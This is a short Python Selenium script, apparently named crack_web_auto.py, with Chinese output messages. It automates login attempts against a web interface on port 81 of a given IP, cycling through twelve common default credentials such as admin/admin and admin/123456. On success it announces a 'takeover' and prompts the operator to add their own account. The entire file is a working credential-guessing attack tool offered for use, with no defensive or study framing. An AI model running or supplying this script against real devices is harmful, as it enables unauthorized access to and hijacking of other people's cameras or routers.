import subprocess
import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

if len(sys.argv) < 2:
    print("用法：python crack_web_auto.py <IP>")
    sys.exit(1)

ip = sys.argv[1]
url = f"http://{ip}:81"
creds = [
    ("admin", "admin"), ("admin", "123456"), ("admin", "888888"),
    ("admin", "666666"), ("admin", "12345"), ("admin", "111111"),
    ("admin", "000000"), ("admin", "999999"), ("admin", "1234"),
    ("admin", "password"), ("root", "admin"), ("admin", "admin123")
]

print(f"🔥 黑暗接管启动：{ip} 全自动密码破解（20秒内出结果）...")

options = Options()
options.add_argument("--start-maximized")
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

for user, pwd in creds:
    print(f"尝试 {user}:{pwd} ...")
    driver.get(url)
    time.sleep(2)
    
    try:
        username = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "username")))
        password = driver.find_element(By.NAME, "password")
        username.send_keys(user)
        password.send_keys(pwd)
        driver.find_element(By.XPATH, "//button[contains(text(),'登录') or contains(text(),'Login')]").click()
        time.sleep(3)
        
        if "login" not in driver.current_url.lower():
            print(f"✅ 接管成功！用户名: {user}  密码: {pwd}")
            print(f"浏览器已打开，快去加你的专属账号！")
            input("按回车关闭浏览器...")
            driver.quit()
            break
    except:
        pass
else:
    print("❌ 常见密码全失败")
    driver.quit()